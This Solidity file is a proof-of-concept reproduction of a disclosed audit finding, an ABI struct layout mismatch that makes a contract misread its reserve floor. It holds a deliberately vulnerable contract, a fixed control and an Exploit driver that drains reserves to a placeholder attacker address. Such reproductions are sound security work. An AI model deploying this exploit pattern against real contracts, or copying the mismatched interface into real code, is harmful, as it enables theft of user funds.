// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Buck Labs (Strong DAO) finding 64664:
// "ABI struct mismatch in band config" (Spearbit — Strong-DAO Security Review,
// December 2025, reporter R0bert).
//
// `LiquidityWindow` declares its OWN `IPolicyManager.BandConfig` struct whose
// field layout does NOT match the real `PolicyManager.BandConfig`. The external
// call `IPolicyManager(policyManager).getBandConfig(band)` compiles and dispatches
// fine because a function selector depends only on the function name + input
// types — NOT the return type. But the returned bytes are ABI-decoded using the
// CALLER's struct layout, so `LiquidityWindow` reads the wrong 32-byte word.
//
// PolicyManager's real BandConfig head (all-static, so no leading ABI offset):
//   word0 halfSpreadBps | word1 mintFeeBps | word2 refundFeeBps |
//   word3 oracleStaleSeconds | word4 deviationThresholdBps | word5 alphaBps |
//   word6 floorBps | word7 distributionSkimBps | word8+ caps
//
// LiquidityWindow's mismatched BandConfig (7x uint16, all-static) decodes:
//   word0 mintFeeBps | word1 refundFeeBps | word2 halfSpreadBps |
//   word3 alphaBps | word4 floorBps | word5 dexBuyFeeBps | word6 dexSellFeeBps
//
// So LiquidityWindow's `floorBps` (its 5th field, word4) is read from
// PolicyManager's `deviationThresholdBps` (25 bps) instead of the real
// `floorBps` (100 bps). The reserve floor is computed too small, and
// `requestRefund` permits refunds to drain reserves down to the 25 bps level
// instead of stopping at the intended 100 bps floor.
//
// HARM: a refunder over-drains 75 bps-of-supply of reserve tokens (USDC) that
// the intended floor should have protected — reserves fall from the 100 bps cap
// (10,000 USDC) to the 25 bps cap (2,500 USDC); the 7,500 USDC delta leaks to
// the refunder. Negative control: an identical (matching) struct layout reads
// floorBps = 100 and blocks the very same refund.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal ERC20 double for the opaque reserve asset (USDC-like, 6 decimals).
///      This is the out-of-scope external boundary; the vulnerable contracts are real.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public immutable decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// PolicyManager — the REAL BandConfig layout (verbatim from the finding).
// ─────────────────────────────────────────────────────────────────────────────
contract PolicyManager {
    struct CapSettings {
        uint128 maxMintPerBlock;
        uint128 maxRefundPerBlock;
    }

    // Verbatim real struct from the finding:
    struct BandConfig {
        uint16 halfSpreadBps;
        uint16 mintFeeBps;
        uint16 refundFeeBps;
        uint32 oracleStaleSeconds;
        uint16 deviationThresholdBps;
        uint16 alphaBps;
        uint16 floorBps;
        uint16 distributionSkimBps;
        CapSettings caps;
    }

    mapping(uint8 => BandConfig) internal bands;

    constructor() {
        // GREEN band (band 0) defaults: floorBps = 100, deviationThresholdBps = 25.
        bands[0] = BandConfig({
            halfSpreadBps: 20,
            mintFeeBps: 10,
            refundFeeBps: 10,
            oracleStaleSeconds: 3600,
            deviationThresholdBps: 25, // word4 — misread as floorBps by LiquidityWindow
            alphaBps: 5000,
            floorBps: 100, // word6 — the real reserve floor (100 bps)
            distributionSkimBps: 0,
            caps: CapSettings({maxMintPerBlock: 0, maxRefundPerBlock: 0})
        });
    }

    function getBandConfig(uint8 band) external view returns (BandConfig memory) {
        return bands[band];
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// LiquidityWindow's LOCAL, MISMATCHED interface (verbatim from the finding).
// Same function name + input type (uint8) => same selector `getBandConfig(uint8)`,
// but the return is decoded with THIS 7x-uint16 layout.
// ─────────────────────────────────────────────────────────────────────────────
interface IPolicyManager {
    struct BandConfig {
        uint16 mintFeeBps;
        uint16 refundFeeBps;
        uint16 halfSpreadBps;
        uint16 alphaBps;
        uint16 floorBps; // @> mismatched position: ABI-decodes PolicyManager word4 (deviationThresholdBps=25), not the real floorBps (100)
        uint16 dexBuyFeeBps;
        uint16 dexSellFeeBps;
    }

    function getBandConfig(uint8 band) external view returns (BandConfig memory);
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE LiquidityWindow — decodes getBandConfig with the mismatched struct
// and uses the misread `floorBps` to compute the reserve floor in requestRefund.
// ─────────────────────────────────────────────────────────────────────────────
contract LiquidityWindow {
    uint256 internal constant BPS_DENOMINATOR = 10000;

    address public policyManager;
    MiniToken public reserveToken;
    uint256 public totalTokenSupply;
    uint256 public reserves;

    constructor(address _policyManager, address _reserveToken, uint256 _totalTokenSupply, uint256 _reserves) {
        policyManager = _policyManager;
        reserveToken = MiniToken(_reserveToken);
        totalTokenSupply = _totalTokenSupply;
        reserves = _reserves;
    }

    function _calculateFloor(IPolicyManager.BandConfig memory bandConfig) internal view returns (uint256) {
        // floorBps here is the MISREAD 5th field (deviationThresholdBps, 25 bps).
        return (totalTokenSupply * bandConfig.floorBps) / BPS_DENOMINATOR;
    }

    /// @notice Exposes the floorBps value LiquidityWindow actually decodes.
    function readFloorBps(uint8 currentBand) external view returns (uint16) {
        return IPolicyManager(policyManager).getBandConfig(currentBand).floorBps;
    }

    function requestRefund(uint8 currentBand, uint256 amount, address to) external returns (uint256) {
        IPolicyManager.BandConfig memory bandConfig =
            IPolicyManager(policyManager).getBandConfig(currentBand); // decodes with the wrong layout
        uint256 floor = _calculateFloor(bandConfig);
        require(reserves - amount >= floor, "below reserve floor");
        reserves -= amount;
        reserveToken.transfer(to, amount);
        return amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED LiquidityWindow (negative control) — uses PolicyManager's real struct
// (identical, matching layout), so floorBps is read correctly (100 bps) and the
// same below-floor refund is blocked. Mirrors the actual fix (shared/dedicated
// getter) at the struct-layout level.
// ─────────────────────────────────────────────────────────────────────────────
contract LiquidityWindowFixed {
    uint256 internal constant BPS_DENOMINATOR = 10000;

    address public policyManager;
    MiniToken public reserveToken;
    uint256 public totalTokenSupply;
    uint256 public reserves;

    constructor(address _policyManager, address _reserveToken, uint256 _totalTokenSupply, uint256 _reserves) {
        policyManager = _policyManager;
        reserveToken = MiniToken(_reserveToken);
        totalTokenSupply = _totalTokenSupply;
        reserves = _reserves;
    }

    function _calculateFloor(PolicyManager.BandConfig memory bandConfig) internal view returns (uint256) {
        return (totalTokenSupply * bandConfig.floorBps) / BPS_DENOMINATOR;
    }

    function readFloorBps(uint8 currentBand) external view returns (uint16) {
        return PolicyManager(policyManager).getBandConfig(currentBand).floorBps;
    }

    function requestRefund(uint8 currentBand, uint256 amount, address to) external returns (uint256) {
        PolicyManager.BandConfig memory bandConfig =
            PolicyManager(policyManager).getBandConfig(currentBand); // matching layout => correct floorBps
        uint256 floor = _calculateFloor(bandConfig);
        require(reserves - amount >= floor, "below reserve floor");
        reserves -= amount;
        reserveToken.transfer(to, amount);
        return amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: a refunder drains reserves below the intended 100 bps floor
// down to the misread 25 bps level. The over-drained reserve tokens (75 bps of
// supply) leak to the attacker EOA. The fixed variant blocks the identical refund.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    uint8 internal constant GREEN_BAND = 0;

    // Reserve asset supply the floor is measured against: 1,000,000 USDC (6 decimals).
    uint256 internal constant TOTAL_SUPPLY = 1_000_000 * 1e6;
    uint256 internal constant CORRECT_FLOOR = (TOTAL_SUPPLY * 100) / 10000; // 10,000 USDC (100 bps)
    uint256 internal constant BUGGY_FLOOR = (TOTAL_SUPPLY * 25) / 10000; //  2,500 USDC ( 25 bps)
    uint256 internal constant START_RESERVES = CORRECT_FLOOR; // reserves sit exactly at the intended floor
    uint256 internal constant DRAIN_AMOUNT = START_RESERVES - BUGGY_FLOOR; //  7,500 USDC ( 75 bps)

    // Exposed results for the driver / Playground.
    address public reserveTokenAddr;
    address public policyManagerAddr;
    address public liquidityWindowAddr;
    address public liquidityWindowFixedAddr;

    uint16 public buggyFloorBps;
    uint16 public correctFloorBps;
    uint256 public attackerDrained;
    bool public fixedRefundBlocked;

    function run() external payable {
        // --- deploy the reserve token double + the REAL vulnerable contracts ---
        MiniToken reserve = new MiniToken("USD Coin", "USDC", 6); // deploy 0
        PolicyManager pm = new PolicyManager(); // deploy 1
        LiquidityWindow lw = new LiquidityWindow(address(pm), address(reserve), TOTAL_SUPPLY, START_RESERVES); // deploy 2
        LiquidityWindowFixed lwFixed =
            new LiquidityWindowFixed(address(pm), address(reserve), TOTAL_SUPPLY, START_RESERVES); // deploy 3

        reserveTokenAddr = address(reserve);
        policyManagerAddr = address(pm);
        liquidityWindowAddr = address(lw);
        liquidityWindowFixedAddr = address(lwFixed);

        // --- fund each window's reserves (held on-contract) ---
        reserve.mint(address(lw), START_RESERVES);
        reserve.mint(address(lwFixed), START_RESERVES);

        // --- the mismatched struct misreads the floor as 25 bps, the fix reads 100 bps ---
        buggyFloorBps = lw.readFloorBps(GREEN_BAND); // 25 (deviationThresholdBps)
        correctFloorBps = lwFixed.readFloorBps(GREEN_BAND); // 100 (real floorBps)

        // --- BUGGY path: refund drains reserves from the 100 bps floor to the 25 bps level ---
        uint256 balBefore = reserve.balanceOf(ATTACKER);
        lw.requestRefund(GREEN_BAND, DRAIN_AMOUNT, ATTACKER);
        attackerDrained = reserve.balanceOf(ATTACKER) - balBefore;

        // --- NEGATIVE CONTROL: matching layout => floor = 100 bps => same refund blocked ---
        try lwFixed.requestRefund(GREEN_BAND, DRAIN_AMOUNT, ATTACKER) returns (uint256) {
            fixedRefundBlocked = false;
        } catch {
            fixedRefundBlocked = true;
        }

        // --- HARM: refunder over-drained 75 bps of supply the floor should have protected ---
        require(buggyFloorBps == 25, "expected misread floor 25");
        require(correctFloorBps == 100, "expected real floor 100");
        require(attackerDrained == DRAIN_AMOUNT, "buggy path must over-refund");
        require(fixedRefundBlocked, "fixed path must block the refund");
    }
}
